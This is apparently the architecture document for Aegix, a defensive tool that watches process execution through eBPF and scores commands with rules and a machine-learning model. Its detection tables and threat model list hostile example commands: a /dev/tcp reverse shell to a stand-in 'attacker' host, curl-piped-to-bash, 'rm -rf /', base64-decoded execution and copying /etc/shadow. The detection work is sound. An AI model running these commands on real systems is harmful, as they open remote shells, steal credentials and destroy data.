# System Architecture

<p align="center">
   <img src="../frontend/src/assets/aegix-logo.png" alt="Aegix logo" width="180" />
</p>

## Overview

Aegix is a **four-layer real-time RCE prevention system** that combines an always-on agent, kernel-level monitoring, intelligent threat detection, and a live dashboard.

```
┌─────────────────────────────────────────────────────────────┐
│  Layer 4: Dashboard (Visualization & Alerting)             │
│  - React web UI                                            │
│    * Proxy: NGINX routes / to frontend, /api to backend    │
│  - Real-time event feed via WebSocket                      │
│  - Risk visualization & attack analysis                    │
└──────────────────────┬──────────────────────────────────────┘
                       │ WebSocket / HTTP
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 3: Aegix API & Intelligence (The Brain)             │
│  - Golang Backend (Chi Router)                             │
│  - Supabase Postgres (Cold Storage for users, settings)    │
│  - OAuth Authentication (Google/GitHub, JWT Sessions)      │
│  - Rule Engine & ML Scorer (Threat Detection)              │
│  - Classification (safe/suspicious/malicious)             │
└──────────────────────┬──────────────────────────────────────┘
                       │ High-speed local sync
                       ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 2: Edge Sync Agent (The Cache)                      │
│  - High-speed SQLite DB running locally on the edge node   │
│  - Caches eBPF events before pushing to PostgreSQL         │
│  - Ensures zero data loss during network interruptions     │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌─────────────────────────────────────────────────────────────┐
│  Layer 1: Aegix Enforcement (The Muscle)                   │
│  - eBPF tracepoint hook on execve syscall                  │
│  - Captures: pid, ppid, uid, command, args                 │
│  - Streams events to user space via ring buffer            │
│  - Graceful fallback on Windows/WSL2                       │
└─────────────────────────────────────────────────────────────┘
```

Hosted demos:
- Hugging Face Space: https://huggingface.co/spaces/Raphel3116/aegix_security

---

## Data Flow

### 1. Command Execution Path

```
User/Process attempts execution
       ↓
Aegix (eBPF) intercepts execve (Linux only)
       ↓
Ring buffer → User space (Go runtime)
       ↓
Event stored in local Edge SQLite DB (high-speed write)
       ↓
Detection Pipeline receives event
       ↓
Rule Engine + ML Scorer analyze command
       ↓
Risk score calculated (0-100)
       ↓
Event synced to Supabase Postgres (Cloud Cold Store)
       ↓
WebSocket broadcasts to all connected clients
       ↓
Dashboard updates in real-time
```

### 2. API Command Analysis Path

```
curl -X POST /api/analyze {"command":"..."}
       ↓
NGINX Proxy forwards request to Go Backend (Port 8000)
       ↓
Go Chi Router Endpoint receives request
       ↓
Detection Pipeline.Detect(command)
       ↓
Rule Engine + ML Scorer process
       ↓
Risk score + classification returned
       ↓
Client receives JSON response
```

---

## Component Details

### Layer 1 & 2: Edge Sync Agent & Kernel Guard

**File**: `backend/internal/store/sync_agent.go`, `backend/kernel/rce_monitor.go` (Roadmap)

**Responsibility**: Monitor system calls at kernel level and cache events locally before syncing to the cloud.

**Key Features**:
- High-speed local SQLite database (`data/.aegix_edge.db`) ensures zero event loss even if the cloud Supabase Postgres is unreachable.
- Hooks `tracepoint/syscalls/sys_enter_execve` (kernel 5.4+) via eBPF (currently Python BCC, migrating to Cilium eBPF in Go).
- Zero-copy event streaming via BPF ring buffer
- Captures with minimal overhead (<1% CPU)

**Implementation Details**:
- **Language**: Go (Edge Agent) + eBPF (Kernel hook)
- **Local Cache**: SQLite with WAL mode enabled for maximum concurrency.
- **Sync Strategy**: Background goroutine polls local SQLite and pushes batches to the cloud Supabase Postgres database.
- **Data Transport**: BPF ring buffer (zero-copy, lock-free)
- **Overhead**: <1% CPU on idle systems

### Layer 3: Aegix API (Detection Pipeline)

**Files**: 
- `backend/internal/detector/rule_engine.go` - Pattern matching
- `backend/internal/detector/ml_scorer.go` - ML inference placeholder
- `backend/internal/detector/pipeline.go` - Orchestration

**Responsibility**: Analyze commands and determine threat level

#### Sub-Layer 3A: Rule Engine (60% weight)

Pattern-based detection for common RCE attacks:

| Pattern | Examples | Score |
|---------|----------|-------|
| Shell Piping | `curl \| bash` | +25 |
| Reverse Shells | `/dev/tcp, nc -l, socat` | +30 |
| Destructive | `rm -rf /, mkfs, dd /dev/zero` | +35 |
| Privilege Escalation | `sudo -u root, su root` | +25 |
| Data Exfiltration | `cat /etc/shadow > /tmp/` | +20 |
| Encoded Payloads | `base64 -d, xxd -r` | +15 |

Rules are cumulative (capped at 100).

**Code Example**:
```python
rule_score, matched_rules = rule_engine.score_rules(command)
# Returns: (45.0, ["shell_piping", "reverse_shell_pattern"])
```

#### Sub-Layer 2B: ML Scorer (40% weight)

Machine learning classification using scikit-learn:

**Model**: Logistic Regression
**Training Data**: ~12,000 sanitized commands (safe + malicious)
**Features**: 5,000-feature TF-IDF with unigrams + bigrams, sublinear_tf, balanced class weights
**Accuracy**: 98.83% · MAP: 0.9925 · R²: 0.9060 · RMSE: 0.1208

**Feature Engineering**:
- Command token frequency (TF-IDF weighted)
- N-gram patterns (`|bash`, `-e /bin/sh`, etc.)
- Sublinear TF dampening (prevents token-spam attacks)
- Balanced class weights (prevents safe-class bias)

**Code Example**:
```go
mlScore, confidence := mlScorer.ScoreML(command)
// Returns: (85.3, 0.92) - 85.3/100 malicious probability, 92% confidence
```

#### Sub-Layer 3C: Memory Profiler (post-ring-buffer)

The Memory Profiling layer runs **after** the eBPF event surfaces from the kernel ring buffer, before the command enters the detection pipeline.

**Why not in the eBPF C program?**
- The eBPF VM verifier prohibits floating-point arithmetic (bytes → MB requires division).
- `task_mem_info()` requires CO-RE BTF type information not available on all kernel versions.
- Short-lived processes (e.g. `ls`) exit before the ring buffer is flushed — making in-kernel sampling unreliable.

**Implementation** (`backend/internal/store/sync_agent.go`):
```go
// Runs immediately when the event exits the ring buffer (T=0)
proc, err := process.NewProcess(int32(execveEvent.PID))
var processMemoryMB float64
if err == nil {
    memInfo, err := proc.MemoryInfo()
    if err == nil {
        processMemoryMB = float64(memInfo.RSS) / (1024 * 1024)
    }
}
```

**Scoring Rules** (`backend/internal/detector/rule_engine.go`):

| Condition | Rule Name | Penalty |
|---|---|---|
| Process RSS > 50 MB at T=0 | `memory_hog_Xmb` | +30 pts |
| System RAM > 80% at intercept | `system_memory_critical_X%` | +10 pts |

**Why these thresholds?**
- A legitimately simple shell script should consume < 5 MB at spawn time. 50 MB is the threshold for "this process pre-allocated a suspicious buffer" — consistent with crypto-miners, exploitation payloads, and fork-bombs.
- 80% system RAM means the server is already under serious memory pressure. Any new process with a pattern match in that context has an elevated DoS risk score.

**Dashboard**: Both metrics are displayed in the Live Events Table (`Mem MB` and `RAM %` columns) and the Latest Detection card. Values exceeding thresholds are highlighted in red/amber.

#### Sub-Layer 3D: Combined Scoring

```go
riskScore := 0.6 * ruleScore + 0.4 * mlScore

// Classification thresholds:
var classification string
if riskScore < 30 {
    classification = "safe"           // Allow execution
} else if riskScore < 70 {
    classification = "suspicious"     // Log & allow
} else {
    classification = "malicious"      // Block & alert
}
```

### Layer 4: Dashboard (Visualization)

**Files**: `frontend/src/` (React + TypeScript)

**Responsibility**: Real-time visualization of threats

**Key Components**:

1. **WebSocket Connection**
   - `useWebSocket.ts` hook
   - Exponential backoff reconnect with jitter
   - Buffers last 1000 events in memory

2. **Dashboard View**
   - `Dashboard.tsx` - Main component
   - Stats cards (total, safe, suspicious, malicious)
   - Event table with risk visualization
   - Real-time updates

3. **Styling**
   - Color coding: Green (safe), Yellow (suspicious), Red (malicious)
   - Risk score bar chart
   - Responsive grid layout

### Layer 4: Agent Runtime (Always On)

**Files**: `backend/cmd/aegix/main.go`

**Responsibility**: Start the backend and choose the correct runtime mode for the host OS

**Key Features**:
- Written in Go for zero-dependency deployment
- Detects Linux, macOS, Windows, or unsupported platforms
- Uses kernel mode on Linux
- Uses API-only mode on macOS and Windows
- Provides a consistent launch path for the rest of the stack

---

## API Reference

(Moved to `API.md`)

---

## Threat Model

### Attacks Detected

1. **Command Injection**
   - Pattern: `;`, `&&`, `||`, `|` with shell tools
   - Example: `ping google.com; cat /etc/shadow`

2. **Shell Escapes**
   - Pattern: Direct bash/sh/eval execution
   - Example: `bash -i`, `eval $(...)`, `exec /bin/bash`

3. **Reverse Shells**
   - Pattern: `/dev/tcp`, `nc`, `socat`, `tclsh`
   - Example: `bash -i >& /dev/tcp/attacker/4444 0>&1`

4. **Destructive Commands**
   - Pattern: Filesystem/system destruction
   - Example: `rm -rf / --no-preserve-root`, `mkfs`, `dd if=/dev/zero`

5. **Privilege Escalation**
   - Pattern: `sudo`, `su` with dangerous flags
   - Example: `sudo -u root /bin/bash`

6. **Data Exfiltration**
   - Pattern: Reading sensitive files
   - Example: `cat /etc/shadow > /tmp/shadow.txt`

7. **Encoded Payloads**
   - Pattern: Base64, hex decoding before execution
   - Example: `base64 -d | bash`, `echo \x2f\x62\x69\x6e\x2f\x62\x61\x73\x68`

### Limitations

- **False Positives**: Legitimate `eval` or `base64` usage flagged
- **Encoded Attacks**: Multi-layer encoding may bypass detection
- **Zero-Days**: Unknown attack vectors not in training data
- **LLM Reasoning**: Async interpretation remains a future enhancement

---

## Performance Characteristics

### Rule Engine
- **Time**: <1ms per command
- **Memory**: ~5KB resident
- **Accuracy**: 100% on known patterns

### ML Scorer
- **Time**: ~2-5ms per command (Go inference)
- **Memory**: ~2MB model size
- **Accuracy**: ~90% on test set

### eBPF Monitor
- **Overhead**: <1% CPU (ring buffer polling)
- **Latency**: <100μs per event
- **Memory**: ~50MB (ring buffer + maps)

### Total Decision Time
- **Combined**: ~5-10ms (rules + ML)
- **Async LLM**: +500ms-2s (future, non-blocking)

---

## Security Considerations

### Privilege Requirements

| Component | Requirement | Note |
|-----------|-------------|------|
| Rule Engine | None | User-space |
| ML Scorer | None | User-space |
| eBPF Monitor | CAP_BPF | Kernel requires capability |
| Dashboard | None | Web-based |

### Attack Surface

1. **Model Poisoning**: Retraining on malicious data could corrupt classifier
   - Mitigation: Version control + manual review of new data

2. **Bypass**: Sophisticated encoding might evade rules
   - Mitigation: Continuous rule updates + ML retraining

3. **Denial of Service**: Ring buffer overflow
   - Mitigation: Bounded buffer size + overflow handling

4. **Information Leakage**: Event log stored in memory
   - Mitigation: Clear events periodically + RBAC (future)

---

## Development Phases

### Phase 1: Kernel Monitoring (eBPF) ✅
- Hooking `sys_enter_execve` tracepoint
- Ring buffer integration

### Phase 2: Detection Pipeline ✅
- Rule engine + ML Scoring model
- Classification pipeline

### Phase 3: Real-time Dashboard ✅
- React UI with live WebSocket feed

### Phase 4: Always-On Agent ✅
- Background agent detection loop
- Forwarding events automatically

### Phase 5: Agent-to-Backend Bridge ✅
- `/agent/events` ingestion endpoint

### Phase 6: Persistent Event Storage ✅
- SQLite Database (`data/events.db`)
- In-memory LRU cache

### Phase 7: Alerting & Webhooks ✅
- Configurable webhooks (Slack, Discord)
- Alert history tracking

### Phase 8: Auto-Remediation & Advanced Dashboard ✅
- Kill processes based on classification
- Dynamic AI sensitivity threshold tuning
- Targeted webhook tagging (Safe/Suspicious/Malicious)
- Cyberpunk styled UI with real-time stats

### Phase 9: Enterprise Architecture (The Go Rewrite & Cloud DB) ✅
- Ported backend from Python/FastAPI to Go/Chi for high performance
- Dual-Database Architecture: Supabase Postgres (Cloud) + SQLite (Edge Sync)
- NGINX Reverse Proxy for unified routing
- Google and GitHub OAuth Authentication with secure HTTP-only JWT cookies

---

## Future Enhancements

1. **LLM Reasoning**: Add native Go-based inference for complex interpretation
2. **Cross-Platform**: Windows ETW, Mac DTrace backends
3. **Swagger Integration**: Add interactive API documentation via swaggo
4. **Native Go eBPF**: Port BCC Python loader to Cilium eBPF in Go

---

**Last Updated**: July 2026 | **Status**: Phase 9 Complete
